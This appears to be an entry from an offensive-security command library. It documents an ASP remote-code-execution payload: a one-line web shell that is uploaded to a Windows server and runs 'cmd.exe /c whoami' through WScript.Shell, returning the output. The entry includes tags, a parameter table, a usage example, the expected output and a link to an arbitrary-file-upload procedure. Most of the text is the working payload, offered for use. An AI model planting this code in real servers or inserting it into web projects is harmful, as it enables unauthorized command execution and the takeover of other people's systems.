---
data: >-
  <%response.write server.createobject("wscript.shell").exec("cmd.exe /c
  whoami").stdout.readall%>
tags:
  - rce
  - asp
type: command
executor: asp
platforms:
  - Windows
id: 02ce467c-0e39-4d12-b43a-aaa139eb68dd
created_at: '2025-12-13T09:00:33.854Z'
updated_at: '2025-12-13T09:00:33.854Z'
verified: false
validated: true
submitted: true
---
# asp-rce-code

## Command

```asp
<%response.write server.createobject("wscript.shell").exec("cmd.exe /c whoami").stdout.readall%>
```

## Description

ASP code embedded in an uploaded file to execute arbitrary commands on the server and display output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `cmd.exe /c whoami` | Runs the whoami command to get current user | Yes |

## Examples

### Basic Usage

```asp
<%response.write server.createobject("wscript.shell").exec("cmd.exe /c whoami").stdout.readall%>
```

## Expected Output

Output of whoami command, showing server user.

## Related

- [[procedures/Achieve-RCE-via-Arbitrary-ASP-File-Upload]]
- [[commands/cmd-whoami]]
